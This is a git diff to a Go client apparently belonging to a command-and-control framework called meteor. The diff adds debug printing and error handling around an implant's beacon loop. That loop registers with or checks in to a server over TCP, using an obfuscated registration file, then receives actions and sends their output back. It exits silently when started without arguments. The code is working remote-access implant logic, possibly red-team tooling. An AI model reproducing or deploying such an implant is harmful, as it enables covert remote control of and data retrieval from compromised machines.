@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
@@ -25,20 +26,35 @@ var REGFILE = "$$REGFILE$$"
 // OBFTEXT is the obfuscation text that will be used when generating the regfile
 var OBFTEXT = "$$OBFTEXT$$"
 
+// DEBUG specifies if execution of the client will write output
+var DEBUG = true
+
 func main() {
 	if len(os.Args) != 2 && len(os.Args) != 3 {
+		if DEBUG {
+			fmt.Println("Executed without arguments, exiting...")
+		}
 		os.Exit(0)
 	}
 	for {
 		var payload []byte
 		regstat := cUtils.CheckRegStatus(REGFILE)
+		if DEBUG {
+			fmt.Printf("RegStat: %t\n", regstat)
+		}
 		if regstat {
 			payload = cUtils.GenCheckin(REGFILE, OBFTEXT)
 		} else {
 			payload = cUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
 		}
+		if DEBUG {
+			fmt.Printf("Payload: %s\n", payload)
+		}
 		conn, err := net.Dial("tcp", SERVER)
 		if err != nil {
+			if DEBUG {
+				fmt.Printf("Error connecting to server: %s\n", err.Error())
+			}
 			endCheck()
 			continue
 		}
@@ -48,6 +64,9 @@ func main() {
 		resp := &mcs.MCS{}
 		err = proto.Unmarshal(data, resp)
 		if err != nil {
+			if DEBUG {
+				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
+			}
 			endCheck()
 			continue
 		}
@@ -66,7 +85,12 @@ func main() {
 				Uuid:   uid,
 				Result: acnOut,
 			}
-			acnData, _ := proto.Marshal(acnResp)
+			acnData, err := proto.Marshal(acnResp)
+			if err != nil {
+				if DEBUG {
+					fmt.Printf("Error marshalling data: %s\n", err.Error())
+				}
+			}
 			conn.Write(acnData)
 			acnAck := make([]byte, 512)
 			conn.Read(acnAck) // read the "Add response" status, even tho we don't check it rn
